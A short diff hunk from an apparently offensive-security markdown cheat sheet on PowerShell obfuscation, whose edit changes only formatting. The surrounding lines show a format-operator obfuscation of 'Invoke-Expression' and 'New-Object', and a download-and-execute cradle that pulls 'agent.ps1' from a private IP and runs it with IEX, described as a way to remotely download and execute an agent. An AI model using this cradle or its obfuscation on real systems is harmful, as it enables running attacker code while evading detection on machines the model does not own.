@@ -416,9 +416,9 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 `("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))`
 
-<br />
+---
 
-- Another way to use **splatting + reorder** technic to remote download/execute agent
+      Another way to use 'splatting + reorder' technic to remote download/execute agent
 
 - String command to obfuscate<br />
 `IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/agent.ps1")`
